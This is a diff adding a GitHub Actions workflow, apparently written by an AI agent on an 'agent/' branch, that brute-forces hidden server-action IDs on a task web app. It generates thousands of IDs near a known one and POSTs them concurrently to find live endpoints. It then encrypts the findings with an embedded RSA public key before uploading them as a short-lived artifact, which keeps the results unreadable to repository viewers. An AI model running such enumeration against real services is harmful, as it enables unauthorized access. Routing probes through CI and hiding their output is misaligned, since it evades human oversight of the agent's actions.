@@ -1,0 +1,78 @@
+name: launchlet-part2-action-nearby
+
+on:
+  push:
+    branches: [agent/launchlet-part2-action-nearby-20260808]
+
+permissions:
+  contents: read
+
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    timeout-minutes: 5
+    steps:
+      - name: Enumerate action IDs near published server reference
+        shell: bash
+        run: |
+          set -euo pipefail
+          umask 077
+          mkdir -p package/out
+          cat > package/public.pem <<'PEM'
+          -----BEGIN PUBLIC KEY-----
+          MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAlOxaJs92lwtrdk6J2LR9
+          QeyG3A5H0rzGOQHw80MWPcOeEs5pzn37ilHloXnTkGk4PmJU67C06N9OOsgqU1kF
+          iydiljdl6RfwF/OSjMsNfRYsyBr1wONeO+9f+72VjLlNWqWVll2qeczrxppOulhJ
+          r+qBx95tdasvdCgh7aTShlkXF7e9+JjK19MrG+Lyj+I7B6bbTsp7D+PiJMlpepWk
+          hoz0jBO8Rgtodz7i/+9Z3RVVhqREdK3uA0Va5ia57Gp3hlvQGbjGxE6TC7q4s1/p
+          q6VF10bVOx8kwE2KggVgsX3uudJlzSvHV3f1coMdwyTSALsAjvAlZQwSts3eHjnF
+          SQIDAQAB
+          -----END PUBLIC KEY-----
+          PEM
+          python3 - <<'PY'
+          import requests,pathlib,urllib.parse,json,concurrent.futures
+          base='https://task-launchlet-web-medium-18cf6be4db586bb6.caplag-task.ru/'
+          out=pathlib.Path('package/out'); s=requests.Session(); s.headers['User-Agent']='Mozilla/5.0'
+          boot=s.get(urllib.parse.urljoin(base,'/api/app/bootstrap'),timeout=10).json(); refs=s.get(urllib.parse.urljoin(base,boot['api']['serverReferences']),timeout=10).json(); act=refs['serverActions']['inspectDeploy']; known=act['id']; hx=known[4:]; n=int(hx,16); url=urllib.parse.urljoin(base,act['endpoint'])
+          H={'Accept':'application/json','Content-Type':'application/json','X-Launchlet-Preview':boot['project'],'User-Agent':'Mozilla/5.0'}; args={'workspaceId':boot['workspace'],'projectId':boot['project']}
+          ids=set()
+          for d in range(-4096,4097):
+            if d: ids.add('act_'+format((n+d)&((1<<64)-1),'016x'))
+          hexd='0123456789abcdef'
+          for i,ch in enumerate(hx):
+            for c in hexd:
+              if c!=ch: ids.add('act_'+hx[:i]+c+hx[i+1:])
+          # Nearby rotations / common low suffix changes
+          for last in range(0,65536):
+            if last<256 or last in [0x1337,0x2026,0x8b11,0xbeef,0xcafe,0xdead]:
+              ids.add('act_'+hx[:-4]+format(last,'04x'))
+          ids.discard(known); ids=sorted(ids)
+          def one(aid):
+            try:
+              r=requests.post(url,headers=H,json={'actionId':aid,'args':args},timeout=4,allow_redirects=False)
+              if not (r.status_code==404 and r.text.strip()=='{"error":"unknown_action"}'):
+                return {'actionId':aid,'status':r.status_code,'body':r.text,'headers':dict(r.headers)}
+            except Exception: pass
+          hits=[]
+          with concurrent.futures.ThreadPoolExecutor(max_workers=64) as ex:
+            for x in ex.map(one,ids,chunksize=30):
+              if x:hits.append(x)
+          (out/'summary.json').write_text(json.dumps({'count':len(ids),'hits':hits},indent=2))
+          PY
+          tar -C package/out -czf package/result.tgz .
+          openssl rand 32 > package/aes.key
+          openssl rand 16 > package/iv.bin
+          KEY_HEX="$(python3 -c "print(open('package/aes.key','rb').read().hex())")"
+          IV_HEX="$(python3 -c "print(open('package/iv.bin','rb').read().hex())")"
+          openssl enc -aes-256-cbc -K "$KEY_HEX" -iv "$IV_HEX" -in package/result.tgz -out package/result.enc
+          openssl pkeyutl -encrypt -pubin -inkey package/public.pem -pkeyopt rsa_padding_mode:oaep -pkeyopt rsa_oaep_md:sha256 -in package/aes.key -out package/key.enc
+          mkdir -p artifact
+          base64 -w0 package/result.enc > artifact/result.enc.b64
+          base64 -w0 package/key.enc > artifact/key.enc.b64
+          base64 -w0 package/iv.bin > artifact/iv.bin.b64
+          rm -rf package
+      - uses: actions/upload-artifact@v4
+        with:
+          name: launchlet-part2-action-nearby-encrypted
+          path: artifact/
+          retention-days: 1
